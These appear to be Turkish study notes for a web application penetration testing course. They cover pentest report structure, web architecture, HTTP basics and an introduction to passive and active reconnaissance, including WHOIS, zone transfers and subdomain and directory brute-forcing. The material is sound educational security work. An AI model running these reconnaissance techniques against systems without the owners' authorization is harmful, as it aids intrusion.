Sızma testi raporunun temelini, ayrıntılı bulguların yer aldığı bu bölüm oluşturur. Tespit edilen her bir güvenlik açığı; sorunla ilgili kapsamlı bir açıklama, yeniden üretim adımları ve uygulama ile organizasyon üzerindeki potansiyel etkileriyle birlikte listelenir. Güvenlik açıkları, giderme sürecinin önceliklendirilmesine yardımcı olmak için **kritik, yüksek, orta, düşük** gibi önem derecelerine göre sınıflandırılır.

**Kavram Kanıtı (Proof of Concept – PoC):**  
Her bir güvenlik açığı için, sızma testini gerçekleştiren uzman tarafından bir **kavram kanıtı (PoC)** eklenir. Bu PoC, açığın gerçekten sömürülebilir olduğunu gösteren somut kanıt niteliği taşır. Ayrıca, geliştiricilerin güvenlik açığını yeniden üretmek için gerekli adımları net bir şekilde anlamasına yardımcı olur.

**Risk Değerlendirmesi ve Öneriler (Risk Rating and Recommendations):**  
Bu bölümde, tespit edilen güvenlik açıkları daha detaylı analiz edilerek **risk derecelendirmesi** ve organizasyon üzerindeki potansiyel etkileri belirlenir. Risk değerlendirmesinde, açığın sömürülebilirlik olasılığı, sömürünün kolaylığı, potansiyel veri sızıntısı ve iş üzerindeki etkisi gibi faktörler dikkate alınır. Ayrıca, her bir güvenlik açığını gidermek ve azaltmak için **spesifik öneriler** ve en iyi uygulamalar sunulur.

**Giderme Planı (Remediation Plan):**  
Rapor, tespit edilen güvenlik açıklarının giderilmesi için gereken adımları ve eylemleri detaylı bir şekilde açıklayan bir **giderme planı** içermelidir. Bu plan, geliştirme ve BT ekiplerinin güvenlik sorunlarını sistematik bir şekilde önceliklendirmesine ve çözmesine rehberlik eder.

==OWASP WSTG içinden son bölümde raporlama ile ilgili bir böçlüm bulunmaktadır.==
Ayrıca bir diğer önemli kaynak da : https://pentestreports.com/
# Architecture & Components and HTTP/S Protocol Fundamentals(WPT):

Aşağıda bu ana başlık altında işlenecek alt konu başlıkları verilmiştir:

![[Ekran görüntüsü 2025-08-07 202218.png]]
#### What is WebApp  and Architecture:

*Web Uygulaması Mimarisi ve Güvenlik Açısından Önemi:*

Web uygulaması mimarisi, bir web uygulamasının temelini oluşturan bileşenlerin (sunucu, istemci, veritabanı, API’ler vb.) ve bu bileşenlerin birbirleriyle nasıl iletişim kurduğunun tanımıdır. Bu mimari yapı, kullanıcı isteklerinin nasıl işlendiği, verilerin nasıl yönetildiği ve uygulamanın genel işlevselliğinin nasıl sağlandığı gibi temel süreçleri belirler.

Sağlam bir mimari tasarım; **ölçeklenebilirlik** (yük arttığında performansın korunması), **bakım kolaylığı** (yazılımın sürdürülebilirliği) ve **güvenlik** (saldırılara karşı direnç) açısından kritik öneme sahiptir.

==Bir web uygulamasında güvenlik değerlendirmesi (security assessment) yapmadan önce, mimarinin nasıl çalıştığını anlamak oldukça önemlidir. Çünkü bu anlayış sayesinde potansiyel güvenlik açıklarının veya yanlış yapılandırmaların nerede ve nasıl oluşabileceğini tespit etmek ve bunların olası sömürü yollarını belirlemek çok daha kolay hale gelir.==

Örneğin, istemci-sunucu etkileşimi sırasında hangi verilerin kullanıcıdan alınıp sunucuya gönderildiği, bu verilerin nasıl işlendiği ve nerelerde güvenlik katmanları bulunduğu, güvenlik testlerinin temel odak noktalarını oluşturur.

*Web Uygulamalarında İstemci-Sunucu Mimarisi:*

Web uygulamaları genellikle **istemci-sunucu (client-server)** modeline dayalı olarak geliştirilir. Bu mimari yapı, uygulamayı iki ana bileşene ayırır: **İstemci (client-side)** ve **Sunucu (server-side)**.

**İstemci (Client):**  
İstemci tarafı, kullanıcı arayüzünü (UI) barındıran ve kullanıcının web uygulamasıyla doğrudan etkileşim kurduğu katmandır. Genellikle bir web tarayıcısı üzerinden erişilen bu ön yüz (frontend), HTML, CSS ve JavaScript gibi teknolojilerle geliştirilir. İstemci, web sayfalarını görüntülemenin yanı sıra, kullanıcıdan gelen girişleri (form verileri, buton tıklamaları vb.) işler ve bu verileri sunucuya göndererek veri talepleri veya işlem istekleri başlatır.

**Sunucu (Server):**  
Sunucu tarafı, uygulamanın iş mantığını (business logic) yürüten ve verilerin işlendiği arka uç katmanıdır. Sunucu, istemciden gelen HTTP isteklerini alır, gerektiğinde veritabanları veya diğer servislerle (örneğin üçüncü taraf API’ler) iletişime geçer, alınan verileri işler ve ardından uygun yanıtı istemciye iletir. Bu süreçte güvenlik, erişim kontrolleri ve oturum yönetimi gibi kritik işlemler de sunucu tarafından gerçekleştirilir.

Bu istemci-sunucu etkileşimi, modern web uygulamalarının temelini oluşturur ve güvenlik açıklarının büyük bir kısmı da bu iletişim akışı içinde ortaya çıkar. Bu nedenle, güvenlik değerlendirmesi yaparken her iki tarafın da sorumlulukları ve zayıf noktaları dikkatle incelenmelidir.

*İstemci Taraflı (Client-Side) İşleme ve Sınırlamaları

İstemci tarafında işleme (client-side processing), web uygulamasındaki belirli görevlerin ve hesaplamaların, kullanıcının cihazındaki **web tarayıcısı** üzerinden gerçekleştirilmesini ifade eder. Bu işlemler genellikle JavaScript gibi tarayıcıda çalışan betik dilleri aracılığıyla yapılır. Örneğin: form doğrulama, sayfa içi dinamik içerik güncellemeleri (DOM manipülasyonu), animasyonlar ve kullanıcı etkileşimlerine hızlı yanıt verme gibi işlemler istemci tarafında gerçekleştirilir.

İstemci tarafı, web uygulamasının **kullanıcının cihazında çalışan** bölümüdür; kullanıcı arayüzü (UI) burada yer alır ve bu katman sayesinde kullanıcılar uygulamayla doğrudan etkileşim kurar.

Ancak client-side işlemenin bazı **önemli sınırlamaları** vardır:

- **Manipülasyona açıktır:** Kullanıcı, tarayıcıdaki kaynaklara erişebildiği için bu işlemler kolayca görüntülenebilir, değiştirilebilir veya yeniden oynatılabilir (replay attack).
- **Güvenlik açısından risklidir:** Hassas işlemler (örneğin kimlik doğrulama, ödeme işlemleri, erişim kontrolleri) istemci tarafında gerçekleştirilmemelidir. Çünkü kullanıcı tarafında çalışan kodlar kötü niyetli kişiler tarafından değiştirilebilir.
- **Tarayıcıya bağımlıdır:** Farklı tarayıcılar farklı özellikleri desteklediğinden, tutarlılık ve uyumluluk sorunları oluşabilir.

Bu nedenle, güvenlik açısından kritik olan tüm işlemlerin mutlaka sunucu tarafında yapılması gerekir. İstemci tarafı daha çok **kullanıcı deneyimini iyileştirmeye yönelik** olarak kullanılmalıdır.
##### Client-Side Technologies:

Modern web uygulamaları, kullanıcı arayüzünü oluşturmak ve etkileşimli deneyimler sunmak için çeşitli istemci tarafı teknolojilerinden faydalanır. Bu teknolojiler ve bunlara ek blinmesi gererken kavramlar arasında en yaygın olanları şunlardır:

*🔹 HTML (Hypertext Markup Language):*
HTML, web sayfalarının iskeletini ve içeriğini tanımlamak için kullanılan temel bir işaretleme dilidir. Başlıklar, paragraflar, bağlantılar, görseller, formlar gibi kullanıcı arayüzü (UI) öğelerinin yapısını tanımlar. Web sayfasının "ne gösterdiği" HTML ile belirlenir.


*🔹 CSS (Cascading Style Sheets):*
CSS, HTML ile yapılandırılmış içeriğin görsel sunumunu kontrol etmek için kullanılır. Geliştiriciler CSS ile renkleri, yazı tiplerini, boşlukları (margin/padding), hizalamayı, düzeni (grid/flexbox gibi), geçiş efektlerini ve diğer stil özelliklerini tanımlar. Bu sayede kullanıcı arayüzü hem görsel olarak çekici hem de tutarlı hale getirilir.

*🔹 JavaScript:* 
JavaScript, web sayfalarına etkileşim kazandıran bir **istemci tarafı betik (script) dili**dir. Sayfa içeriğini dinamik olarak değiştirmek, kullanıcı etkileşimlerini (tıklama, kaydırma, form gönderme vb.) işlemek, istemci tarafı doğrulamalar yapmak, API istekleriyle veri çekmek gibi işlemler için kullanılır. React, Vue, Angular gibi modern frontend framework’lerinin temelini de JavaScript oluşturur.

*🔹 Çerezler (Cookies) ve Yerel Depolama (Local Storage):*  
Bunlar, kullanıcıya ait verilerin **istemci tarafında** geçici veya kalıcı olarak saklanmasına olanak tanır:

- **Çerezler**, genellikle oturum yönetimi, kimlik doğrulama ve kullanıcı tercihlerini saklamak için kullanılır. Tarayıcı tarafından sunucuya her istekle birlikte otomatik olarak gönderilir.
- **Yerel Depolama (Local Storage / Session Storage)**, daha büyük veri bloklarının sunucuya gönderilmeden kullanıcı cihazında saklanmasını sağlar. JavaScript aracılığıyla erişilir ve genellikle performans iyileştirmesi ya da kullanıcı deneyimini artırma amacıyla kullanılır.

Ancak bu veriler tarayıcıda saklandığı için, **güvenlik önlemleri** alınmadan hassas bilgiler burada tutulmamalıdır. Örneğin, parola veya kişisel veri gibi bilgiler kesinlikle şifrelenmeden yerel depolamada saklanmamalıdır.

*🔹 Web Sunucusu (Web Server):*
Web sunucusu, istemcilerden gelen **HTTP/HTTPS isteklerini** karşılayan bileşendir. Web uygulamasının statik içeriklerini (HTML, CSS, JavaScript dosyaları, resimler vb.) barındırır ve bu içerikleri tarayıcıya sunar. Aynı zamanda, dinamik içerik gerektiğinde bu isteği uygulama sunucusuna yönlendirir.

Yaygın web sunucusu yazılımları arasında şunlar bulunur:

- **Apache HTTP Server (Apache2)**
- **Nginx**
- **Microsoft Internet Information Services (IIS)**

*🔹 Uygulama Sunucusu (Application Server):* 
Uygulama sunucusu, web uygulamasının **iş mantığını (business logic)** yürütür. İstemciden gelen istekleri işler, gerekli hesaplamaları yapar, veritabanlarına erişir ve sonucunda **dinamik içerik** üretir. Bu içerik daha sonra web sunucusu aracılığıyla istemcilere iletilir.

Uygulama sunucusu genellikle bir programlama dili veya framework üzerinde çalışır (örneğin: Node.js, Spring Boot, Django, ASP.NET Core vb.). Böylece kullanıcı oturumları, erişim kontrolleri, işlem mantığı gibi görevler burada gerçekleştirilir.

*🔹 Veritabanı Sunucusu (Database Server):*  
Veritabanı sunucusu, uygulamanın ihtiyaç duyduğu **verilerin depolandığı ve yönetildiği** yerdir. Kullanıcı hesapları, içerikler, ayarlar, günlük kayıtları (loglar) ve diğer tüm yapılandırmalar burada tutulur. Uygulama sunucusu, veritabanıyla iletişim kurarak veri okuma, yazma, güncelleme ve silme işlemlerini gerçekleştirir.

Yaygın veritabanı sistemleri şunlardır:

- **MySQL / MariaDB**
- **PostgreSQL**
- **Microsoft SQL Server**
- **MongoDB (NoSQL örneği)**
##### Server-Side Technologies:

Sunucu tarafı komut dosyası dilleri, web uygulamalarının **arka ucunda çalışan** ve sunucu üzerinde dinamik işlemler gerçekleştiren programlama dilleridir. Bu diller, istemciden gelen talepleri işler, **veritabanlarıyla etkileşim kurar**, kullanıcı girdilerini doğrular ve istemciye gönderilmeden önce **dinamik içerik üretir**.

Sunucu tarafında çalışan bu betikler, tarayıcıda çalışmaz; sadece sunucuda çalışır ve istemciye yalnızca sonuçlar (örneğin işlenmiş HTML) gönderilir. Bu yaklaşım, hem **gizliliği** hem de **güvenliği** artırır.

Yaygın olarak kullanılan sunucu tarafı komut dosyası dilleri şunlardır:

- **PHP:** En eski ve yaygın dillerden biridir. WordPress gibi birçok CMS bu dili kullanır.
- **Python:** Flask ve Django gibi framework’ler aracılığıyla modern web uygulamalarında sıkça kullanılır.
- **Java:** Spring Framework ile kurumsal düzeyde güvenli ve ölçeklenebilir uygulamalarda tercih edilir.
- **Ruby:** Ruby on Rails framework’ü ile popülerlik kazanmıştır; hızlı prototipleme imkanı sunar.
- **Node.js (JavaScript’in sunucu tarafında çalışan hali):** Gerçek zamanlı uygulamalarda ve mikroservis mimarilerinde yaygın olarak kullanılır.

Sunucu tarafı diller sayesinde, örneğin:

- Kullanıcı oturumu doğrulama,
- Rol tabanlı erişim kontrolü,
- Form verisi işleme ve filtreleme,
- API ile iletişim,
- Dinamik sayfa oluşturma işlemleri güvenli şekilde yürütülür.

Sunucu tarafı betiklerin düzgün çalışması ve güvenli olması, uygulamanın genel güvenliğini doğrudan etkiler. Bu nedenle geliştiricilerin, **kod enjeksiyonu (SQLi, RCE)** gibi saldırılara karşı önlem alması gerekir.

==Penetrasyon testlerinde web uygulamasının hangi dille yazıldığı önemlidir. Bu aramanız gereken dosyaları değiştirebileceği gibi aynı zamanda web uygulamasının kendi iç dinamiklerini de değiştirecektir ve bu pentest sürecinin nasıl olacağına önemli ölçüde etki edecektir.==
##### Datan Interchange:

Veri değişimi, farklı bilgisayar sistemleri veya uygulamalar arasında veri alışverişi sürecini ifade eder. Bu süreç, sistemlerin birbiriyle iletişim kurmasını ve bilgi paylaşmasını mümkün kılar. Modern bilişim dünyasında temel bir unsur olan veri değişimi, farklı sistemler, platformlar ve teknolojiler arasında birlikte çalışabilirlik ve veri paylaşımını sağlar. Bu süreç, verilerin bir formattan başka bir formata dönüştürülmesini içerir; böylece alıcı sistemle uyumlu hale getirilir. Bu sayede, veri yapıları, programlama dilleri veya işletim sistemleri ne kadar farklı olursa olsun, veriler alıcı tarafından doğru şekilde yorumlanabilir ve kullanılabilir.

*API’ler* (Uygulama Programlama Arayüzleri), farklı yazılım sistemlerinin birbiriyle etkileşim kurmasını ve veri alışverişi yapmasını sağlayan arayüzlerdir. Web uygulamaları, harici hizmetlerle entegrasyon sağlamak, veri paylaşmak ve diğer uygulamalara çeşitli işlevler sunmak için API’lerden yararlanır. Bu sayede, birbirinden bağımsız sistemler sorunsuz şekilde iletişim kurabilir ve birlikte çalışabilir.
###### Data Interchange Protocol Format  and API:

**JSON (JavaScript Object Notation)** – JSON, hem insanlar hem de makineler tarafından kolayca okunup yazılabilen, hafif ve yaygın olarak kullanılan bir veri değişim formatıdır. JavaScript sözdizimine dayalıdır ve genellikle bir sunucu ile web uygulaması arasında veri iletimi için, XML’e alternatif olarak kullanılır. Basit yapısı sayesinde veri aktarımında hızlı ve verimli bir çözüm sunar.

**XML (eXtensible Markup Language)** – XML, verinin yapısını tanımlamak için etiketler kullanan, esnek bir veri değişim formatıdır. Kullanıcılara kendi etiketlerini tanımlama ve karmaşık hiyerarşik veri yapıları oluşturma imkânı verir. XML, çoğunlukla yapılandırma (konfigürasyon) dosyalarında, web servislerinde ve farklı sistemler arasında veri alışverişinde tercih edilir.

==JSON ve XML **veri değişim formatlarıdır** — yani API’ler üzerinden veya başka yollarla taşınan verinin **nasıl biçimlendirileceğini** belirlerler.==

**REST (Representational State Transfer)** – REST, veri alışverişi için standart HTTP yöntemlerini (GET, POST, PUT, DELETE vb.) kullanan bir yazılım mimari tarzıdır. İnternet üzerinden uygulamaların birbiriyle etkileşim kurmasını ve veri paylaşmasını sağlayan web API’leri geliştirmede yaygın olarak kullanılır. Basit, hafif ve hızlı olması nedeniyle modern web servislerinde tercih edilir.

**SOAP (Simple Object Access Protocol)** – SOAP, web servislerinin uygulanmasında yapılandırılmış bilgiyi değiştirmek için kullanılan bir iletişim protokolüdür. Veri değişim formatı olarak XML kullanır ve farklı sistemler arasında iletişim için standart, katı kurallara dayalı bir yöntem sunar. Güvenlik ve hata yönetimi gibi ek özellikleri sayesinde özellikle kurumsal uygulamalarda tercih edilir.

##### Parsing-DOM-JS Engine:


![[Ekran görüntüsü 2025-08-10 145750.png]]

*Parsing*, en basit tanımıyla:

> Bir metni (kod, veri, HTML vs.) **okuyup parçalara ayırma** ve bilgisayarın anlayabileceği **mantıksal bir yapıya dönüştürme** işlemidir.

Bir tarayıcı **HTML’yi parse ettiğinde**:

- `<h1>Merhaba</h1>` kodunu okur,
- “Bu bir başlık etiketi” diye anlar,
- Bellekte **DOM ağacına** bir “h1 düğümü” ekler.

*DOM (Document Object Model) Nedir?*
DOM, tarayıcıların HTML belgesini bellekte oluşturduğu **ağaç yapılı (tree) modeldir**.

- HTML etiketlerini **nesneler (objects)** olarak temsil eder.

Örneğin;

`document.getElementById("title").innerText = "Merhaba Dünya!";`

Bu kod, DOM’daki `id="title"` elementinin metnini değiştirir.

==📌 Özet akış:==

- **JavaScript engine**, kodu çalıştırır. (JaScript engine, tarayıcının  **JavaScript kodunu çalıştıran motorudur**. Örneğin Google'da V8 motoru.)
- Kod çalışırken **DOM API**’lerini kullanarak HTML yapısını değiştirir.
- DOM’un kendisi JavaScript engine’in içinde değildir; tarayıcı, **rendering engine** (Blink, Gecko vb.) aracılığıyla DOM’u oluşturur ve **JavaScript engine**’e DOM API’sini sağlar.

1. HTML → Tarayıcı **DOM** oluşturur.
2. JavaScript engine → Kodunu çalıştırır.
3. Kod, DOM API üzerinden sayfa ile etkileşime girer.
##### HTTP/S Protocol Fundamentals:

HTTP (Hypertext Transfer Protocol), web uygulaması verileri gibi kaynakların iletiminde kullanılan, durumsuz (stateless) bir uygulama katmanı protokolüdür ve **TCP** üzerinde çalışır. Özellikle web tarayıcıları ile web sunucuları arasındaki iletişim için tasarlanmıştır.

HTTP, iletişimde tipik **istemci-sunucu (client-server)** mimarisini kullanır:
-- **İstemci (client)**: Tarayıcı
- **Sunucu (server)**: Web sunucusu

Kaynaklar, **URL** veya **URI** ile benzersiz olarak tanımlanır.
HTTP’nin iki ana sürümü vardır: **HTTP 1.0** ve **HTTP 1.1**.

- **HTTP 1.1**, günümüzde en yaygın kullanılan sürümdür ve **HTTP 1.0**’a göre daha gelişmiş özelliklere sahiptir.

HTTP iletişimi sırasında istemci (client) ile sunucu (server) arasında mesaj alışverişi yapılır. Bu mesajlar iki ana kategoriye ayrılır: **HTTP istekleri (requests)** ve **HTTP yanıtları (responses)**.

- **İstemci (tarayıcı)** → Sunucuya HTTP request gönderir.
- **Sunucu** → İstemcinin isteğine karşılık HTTP response döner.

![[Ekran görüntüsü 2025-08-10 232242.png]]

*HTTP REQUEST COMPONENT:*

==**Request Line**== (İstek Satırı), bir **HTTP request**’in ilk satırıdır ve üç ana bileşenden oluşur:

1. **HTTP Method*
    - İsteğin türünü belirtir.
    - Örnekler:
        - `GET` → Sunucudan veri almak
        - `POST` → Sunucuya veri göndermek
        - `PUT` → Sunucudaki veriyi güncellemek
        - `DELETE` → Sunucudaki veriyi silmek
2. **URL (Uniform Resource Locator)**
    - İstemcinin erişmek istediği kaynağın adresidir.
    - Örnek: `/index.html`, `/api/users`
3. **HTTP Version**
    - İletişimde kullanılan HTTP sürümünü belirtir.
    - Örnek: `HTTP/1.1`, `HTTP/2`

 `GET /media HTTP/1.1`

==**Request Headers**,== bir HTTP isteğinde, sunucuya ek bilgi iletmek için kullanılan alanlardır.  
Her header, belirli bir amacı olan **anahtar:değer** çiftlerinden oluşur.

 *Yaygın HTTP Request Header’ları:*
 
1. **User-Agent**
    - İsteği yapan istemci (tarayıcı veya uygulama) hakkında bilgi verir.
        `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
2. **Host**
    - Hedef sunucunun alan adını belirtir.
        `Host: www.example.com`
3. **Accept**
    - İstemcinin yanıt olarak kabul edebileceği veri formatlarını belirtir.
    - Örnek:
        `Accept: text/html, application/json`
4. **Authorization**
    - Kimlik doğrulama bilgilerini içerir (örn. Bearer token, Basic auth).
    - Her HTTP isteğine dahil edilmez.
        `Authorization: Bearer eyJhbGciOiJIUzI1NiIs...`
5. **Cookie**
    - İstemcide saklanan çerezleri sunucuya gönderir.
    - Örnek:
        `Cookie: sessionId=abc123; theme=dark`

💡 **Not:**
- Headers, **isteğin içeriği, formatı, yetkilendirme durumu, dil tercihi** gibi birçok detayı taşır.
- Sunucu, gelen bu bilgilere göre yanıtı şekillendirir (örn. doğru dilde sayfa döndürmek).

==**Request Body(Optional)

Body bazı HTTP yöntemlerinde (özellikle **POST** veya **PUT**) sunucuya veri göndermek için kullanılır. Bu alan, tipik olarak **JSON**, **XML** veya **form-data** formatında olabilir ve istemcinin sunucuya göndermek istediği asıl içeriği taşır. Örneğin, bir kayıt formu doldurulduğunda girilen bilgiler, request body içinde sunucuya iletilir. Request body, **GET** gibi veri alma odaklı yöntemlerde genellikle kullanılmaz.
###### HTTP İstek Metodları

- **GET:** Sunucudan veri alır. Body kullanılmaz, veriler genelde URL parametresinde gönderilir.
- **POST:** Sunucuya yeni veri ekler veya işlem yaptırır. Body’de veri gönderilir.
- **PUT:** Var olan kaynağı **tamamen** günceller. Eksik alanlar silinebilir.
- **PATCH:** Var olan kaynağın **sadece belirli alanlarını** günceller.
- **DELETE:** Kaynağı siler.
- **HEAD:** GET gibi çalışır ama yalnızca header bilgilerini döner, body gönderilmesini talep etmez.
- ==**OPTIONS:** Sunucunun belirli bir kaynak için hangi HTTP metodlarını desteklediğini bildiri==

![[Ekran görüntüsü 2025-08-14 215623.png]]

WebDAV, HTTP üzerinden dosya yönetimi yapmanı sağlar (özellikle **MOVE COPY DELETE vb**bu yüzden görünür). 
Yuklarıda options ile bu test edilmiştir. Oldukça tehlikeli olabilir.

*HTTP  RESPONSES COMPONENT:*

==Response headers,== tıpkı request headers gibi, sunucudan gelen yanıt hakkında ek bilgiler sağlar. Yaygın kullanılan response headerlar şunlardır: 
**Content-Type** (yanıt içeriğinin medya tipi, örn. text/html, application/json), 
**Content-Length** (yanıt gövdesinin bayt cinsinden boyutu), 
**Set-Cookie** (istemci tarafında sonraki istekler için çerez ayarlamak amacıyla kullanılır) ve 
**Cache-Control** (önbellekleme davranışına dair yönergeler).

![[Ekran görüntüsü 2025-08-11 164811.png]]

*Status Code*

![[Ekran görüntüsü 2025-08-11 170332.png]]
Örnek bir 302  Resaponse içeriği:
`HTTP/1.1 302 Found`
`Location: https://www.yenisite.com/`
`Content-Length: 0`

- Burada `Location` başlığı tarayıcıya **"artık şu adrese git"** der.

*Cache-Control Directives*

- **no-cache**
    - Kaynak önbelleğe alınabilir ama her kullanımda sunucudan doğrulama yapılmalı.
    - Haber sitesinde içerik önbelleğe alınır ama her seferinde sunucudan güncelliği kontrol edilir.
- **no-store**
    - Kaynak kesinlikle önbelleğe alınmaz, her seferinde sunucudan istenir.
    - Bankacılık uygulamasında işlem sayfaları kesinlikle önbelleğe alınmaz.
- **public**
    - Kaynak herkese açık şekilde (istemci ve ara sunucular dahil) önbelleğe alınabilir.
    - Şirket logosu gibi herkesin erişebileceği statik dosyalar önbelleğe alınabilir.
- **private**
    - Kaynak sadece bireysel kullanıcı tarayıcısında önbelleğe alınabilir, proxy gibi paylaşılan önbelleşer alamaz.
    - Kullanıcıya özel profil sayfası önbelleğe alınabilir, ancak başka kullanıcılar görmemeli.
- **max-age=seconds**
	- Kaynak belirtilen saniye kadar önbellekte tutulur. Örneğin `max-age=3600` → 1 saat.

# Web Enumeration & Information Gaterhing & Web Fingerprinting 

*Outcomes :*
- Introduction To Web Enumeration & Information Gathering
- Finding Website Ownership & IP Addresses
- Reviewing Webserver Metafiles For Information Leakage
- Search Engine Discovery
- Web App Fingerprinting
- Source Code Analysis
- Website Crawling & Spidering
- Web Server Fingerprinting
- DNS Enumeration
- Subdomain Enumeration
- Web App Vulnerability Scanning
- ==Automated Recon OWASP Amass==
## Web Enumeration & Information Gathering:

### Introduction to Enumeration and  Information Gathering:

**Bilgi toplama (Information Gathering)**, bir penetrasyon testinin ilk ve en kritik adımlarından biridir. Bu aşamada hedef hakkında — birey, şirket, web sitesi veya sistem olabilir — olabildiğince fazla bilgi toplanır. İlk adımda elde edilen bilgilerin kalitesi ve kapsamı, sonraki test aşamalarının başarısını doğrudan etkiler. Kısaca, hedef hakkında ne kadar fazla bilgiye sahip olunursa, test süreci o kadar etkili olur.

Bilgi toplama süreci genellikle iki ana kategoriye ayrılır:

1. **Pasif Bilgi Toplama** – Hedefle doğrudan etkileşime girmeden mümkün olduğunca fazla veri toplamayı ifade eder. Örneğin, arama motorları, sosyal medya, WHOIS sorguları, açık kaynak istihbaratı (OSINT) ve sızdırılmış veri kayıtları gibi herkesin erişebileceği kaynaklar kullanılabilir. Bu yöntem düşük riskli olup, genellikle tespit edilmesi zordur.
2. **Aktif Bilgi Toplama (Enumeration)** – Hedef sistemle doğrudan etkileşime girerek bilgi toplamayı içerir. Örnek olarak port taraması, servislerin tespiti, banner grabbing veya zafiyet taramaları verilebilir. Bu yöntem doğrudan hedef üzerinde işlem yapmayı gerektirdiği için mutlaka **yetkilendirme** alınmalıdır; aksi halde yasal sorumluluk doğurabilir.

Hedef sunucu veya web uygulaması hakkında bilgi toplama, herhangi bir penetrasyon testinin **ilk aşaması**dır ve çoğu uzman tarafından sürecin en kritik adımı olarak kabul edilir.
Bu aşamanın önemli noktalarından biri, “gereksiz bilgi” diye bir kavramın olmamasıdır. Toplanan her bilginin mutlaka kaydedilmesi ve sonraki adımlarda kullanılmak üzere saklanması gerekir.

Özellikle **web uygulaması penetrasyon testleri** bağlamında, bu aşamada elde edilen veriler son derece değerlidir. Çünkü toplanan bilgiler, uygulamanın mantığını, yapısını ve işleyişini anlamada büyük rol oynar ve bu sayede ilerleyen aşamalarda yapılacak ilk erişim veya sömürü (exploitation) girişimlerinin başarısını artırır.

*NOT:* Information Gathering, hedef hakkında genel bilgi toplama sürecidir; bu aşamada amaç hedefin IP adresleri, alan adları, DNS kayıtları, kullanılan teknolojiler gibi temel verileri elde etmektir. **Web Enumeration** ise, bu bilgilerin ötesine geçerek web uygulamasının veya sunucunun daha derin ve sistematik bir şekilde incelenmesi sürecidir; yani gizli dizinlerin, alt alan adlarının, parametrelerin, kullanıcı hesaplarının veya servislerin tek tek keşfedilmesidir yani enumere edilmesidir. 
Kısaca, gathering genel veri toplama iken, enumeration ayrıntılı çıkarım ve listeleme aşamasıdır.

*Peki Neye Bakıyoruz?*

- Website & domain ownership.  
- IP addresses, domains and subdomains.  
- Hidden files & directories.  
- Hosting infrastructure (web server, CMS, Database etc).  Example CMS: Wordpess, Joomla, Drupal, HunSpot vb.
- Presence of defensive solutions like a web application firewall  (WAF).

*Pasif Bilgi Toplama (Passive Information Gathering)*

Pasif bilgi toplama aşamasında, hedef sistemle doğrudan etkileşime girmeden farklı kaynaklardan elde edilen veriler toplanır. Bu süreçte gerçekleştirilebilecek başlıca adımlar şunlardır:

- **Alan adlarının ve sahiplik bilgilerinin tespiti** (WHOIS sorguları vb.)
- **Gizli veya erişime kapatılmış dosya ve dizinlerin keşfi** (robots.txt, sitemap.xml vb.)
- **Web sunucusunun IP adresleri ve DNS kayıtlarının belirlenmesi**
- **Hedef sitede kullanılan web teknolojilerinin tespiti** (ör. CMS, framework, programlama dili)
- **WAF (Web Application Firewall) varlığının tespiti**
- **Alt alan adlarının (subdomain) keşfi**
- **Web sitesi içerik yapısının analiz edilmesi**
 
 *Aktif Bilgi Toplama (Active Information Gathering)*

Aktif bilgi toplama aşamasında hedef sistemle **doğrudan etkileşime girilerek** bilgi elde edilir. Bu yöntemler, hedef üzerinde iz bırakabileceği ve tespit edilebileceği için mutlaka yetkilendirilmiş ortamlarda uygulanmalıdır. Başlıca yöntemler şunlardır:

- **Web sitesi / web uygulaması kaynak kodunun indirilip analiz edilmesi**
- **Port taraması ve servis keşfi** (açık portlar ve çalışan servislerin belirlenmesi)
- **Web sunucusu parmak izi çıkarma (fingerprinting)**
- **Web uygulaması güvenlik taramaları** (zafiyet tarayıcıları ile)
- **DNS Zone Transfer işlemleri** (yanlış yapılandırılmış DNS sunucularında kritik bilgilerin elde edilmesi)
- **Brute-Force yöntemiyle alt alan adlarının (subdomain) tespiti**

Bazı yöntemler hem **pasif** hem de **aktif** bilgi toplama kapsamında uygulanabilir.
Fark, **hedefle doğrudan etkileşim** olup olmamasından kaynaklanır, örnek:

- **Subdomain keşfi**
    - _Pasif:_ DNS kayıtlarını, sertifika (SSL/TLS) şeffaflık loglarını, üçüncü taraf kaynakları (crt.sh, VirusTotal) kullanarak alt alan adlarını bulmak.
    - _Aktif:_ Brute-force ile subdomain denemeleri yapmak ya da DNS zone transfer denemek.
- **Teknoloji tespiti (Web Tech Fingerprinting)**
    - _Pasif:_ Wappalyzer, BuiltWith gibi üçüncü taraf servisleri kullanmak.
    - _Aktif:_ Doğrudan HTTP header bilgilerini sorgulamak veya response analizleri yapmak.
- **Dosya/Dizin keşfi**
    - _Pasif:_ robots.txt veya sitemap.xml üzerinden erişim kısıtlı dizinleri öğrenmek.
    - _Aktif:_ Dirbuster/Dirb gibi araçlarla brute-force yaparak dizin taraması gerçekleştirmek.

Yukarıda  bahsedilen pasif ve aktif tarama sürecinin teoriden çok gerçekte nasıl olacağı sorusu ise önceden de işlediğimiz [[#OWASP Web Security Testing Guide (WSTG) and Checklist]] ile ilişkilidir. Bu metadoloji bize kavramlar arasında kaybolmadan teoriyi pratiğe dökmeyi sağlayacaktır.

[Online olarak WSTG'nin ilgili kısmına bakabiliriz:](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/README)
### Enumeration Techniques(passive and active) :

#### whois, host, nslookup(passive):

**WHOIS**, bir sorgulama ve yanıt protokolüdür. İnternet kaynaklarının — örneğin bir alan adı (domain name) veya IP adres bloğu — kime ait olduğunu gösteren kayıtların tutulduğu veritabanlarına sorgu göndermek için kullanılır.

WHOIS sorgulamaları, **komut satırı arayüzü (CLI)** üzerinden whois istemcisi kullanılarak yapılabileceği gibi, farklı veritabanlarından alan adı sahiplik bilgilerini görüntülemeyi sağlayan **üçüncü taraf web tabanlı araçlar** aracılığıyla da gerçekleştirilebilir.

Çoğu durumda NameServer olarak CloudFlare görürüz, 
Cloudflare bir "reverse proxy" gibi çalışır.
- Kullanıcı aslında **Cloudflare IP’sine bağlanır**, gerçek sunucunun IP’si gizlenmiş olur.
- Bu sayede saldırganlar doğrudan hedef sunucunun IP’sine erişemez.

Bu aynı zamanda birçok tehditi de engller örneğin zone transfer denersek:

- Senin zone transfer denemen doğrudan Cloudflare’e gider.
- Cloudflare **kendi nameserver’lerinde AXFR isteklerini kapatmıştır**.
- Yani dışarıdan **zone transfer mümkün değildir**.

Aşağıda deneme ve öğrenim amaçlı CloudFlare ve benzeri bir  CDN arkasında olmayan bir site vardır. (Zonetransfer'i yapılabilir)
https://digi.ninja/projects/zonetransferme.php 

*host, dig, nslookup:*

- **`host`**, DNS sorguları yapmak için kullanılan basit bir **komut satırı aracı**dır.
